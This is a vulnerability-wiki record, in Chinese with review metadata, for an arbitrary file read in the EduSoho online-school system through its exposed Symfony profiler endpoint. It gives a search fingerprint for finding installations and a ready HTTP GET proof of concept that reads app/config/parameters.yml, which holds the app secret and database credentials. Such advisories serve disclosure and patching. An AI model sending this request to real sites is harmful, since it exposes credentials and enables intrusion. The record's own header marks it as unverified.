---
source: "Threekiii/Vulnerability-Wiki"
product: "EduSoho / Symfony profiler"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "EduSoho-教培系统-app_dev.php-任意读取漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：开发调试入口对外暴露且文件可读"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9f504ac372fcd912418e728d"
entity_id: "ve-36409306b2073359d19754ee"
schema_version: "1"
canonical: "Web安全/CMS内容/EduSoho/EduSoho 教培系统 app_dev.php 任意读取漏洞.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：开发调试入口对外暴露且文件可读

- **事实待核（1）**：与135同文，仅来源/资源路径变化；目录把端点当产品拆分。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：未给版本/调试配置/文件读取范围，依赖图片。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# EduSoho 教培系统 app_dev.php 任意读取漏洞

## 漏洞描述

EduSoho 教培系统是由杭州阔知网络科技研发的开源网校系统。

通过向 /app_dev.php/_profiler/open 端点发送可以读取到 app/config/parameters.yml 文件的内容，拿到该文件中保存的 secret 值以及数据库账号密码等敏感信息。

## 漏洞影响

EduSoho 教培系统

## 网络测绘

```
"Powered By EduSoho"
```

## 漏洞复现

登录页面

![image-20231115095857573](./.resource/EduSoho-教培系统-app_dev.php-任意读取漏洞/media/image-20231115095857573.png)

指纹

![image-20231115095301932](./.resource/EduSoho-教培系统-app_dev.php-任意读取漏洞/media/image-20231115095301932.png)

poc

```
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
Host:  
Accept: */*
Content-Type: application/x-www-form-urlencoded
```

![image-20231115095838331](./.resource/EduSoho-教培系统-app_dev.php-任意读取漏洞/media/image-20231115095838331.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
